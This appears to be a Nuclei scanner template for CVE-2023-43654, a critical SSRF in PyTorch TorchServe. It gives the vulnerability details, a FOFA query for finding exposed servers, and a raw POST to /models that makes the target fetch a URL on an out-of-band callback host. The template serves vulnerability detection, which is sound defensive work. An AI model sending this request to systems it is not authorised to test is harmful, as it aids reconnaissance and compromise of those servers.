id: CVE-2023-43654

info:
  name: PyTorch TorchServe SSRF
  author: DhiyaneshDk
  severity: critical
  description: |
    TorchServe is a tool for serving and scaling PyTorch models in production. TorchServe default configuration lacks proper input validation, enabling third parties to invoke remote HTTP download requests and write files to the disk. This issue could be taken advantage of to compromise the integrity of the system and sensitive data. This issue is present in versions 0.1.0 to 0.8.1. A user is able to load the model of their choice from any URL that they would like to use. The user of TorchServe is responsible for configuring both the allowed_urls and specifying the model URL to be used. A pull request to warn the user when the default value for allowed_urls is used has been merged in PR #2534. TorchServe release 0.8.2 includes this change. Users are advised to upgrade. There are no known workarounds for this issue.
  reference:
    - https://github.com/pytorch/serve/pull/2534
    - https://github.com/pytorch/serve/releases/tag/v0.8.2
    - https://github.com/OligoCyberSecurity/ShellTorchChecker
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-43654
    cwe-id: CWE-918
    epss-score: 0.92724
    epss-percentile: 0.99743
    cpe: cpe:2.3:a:pytorch:torchserve:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: pytorch
    product: torchserve
    fofa-query: body="Requested method is not allowed, please refer to API document"
  tags: cve,cve2023,pytorch,oast,ssrf

http:
  - raw:
      - |
        POST /models?url=http%3a//{{interactsh-url}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"

      - type: word
        part: interactsh_request
        words:
          - "User-Agent: Java"

      - type: word
        part: content_type
        words:
          - "application/json"
# digest: 4b0a004830460221009e80940c59c29f77ea8cae3a873b7bd1aad32ea0b293252a07ca33ff815f1bc9022100976e9c2fc22ab32a9706ab34f76058a8b10480a788e1d0bab359cd01b732ffcf:922c64590222798bb761d5b6d8e72950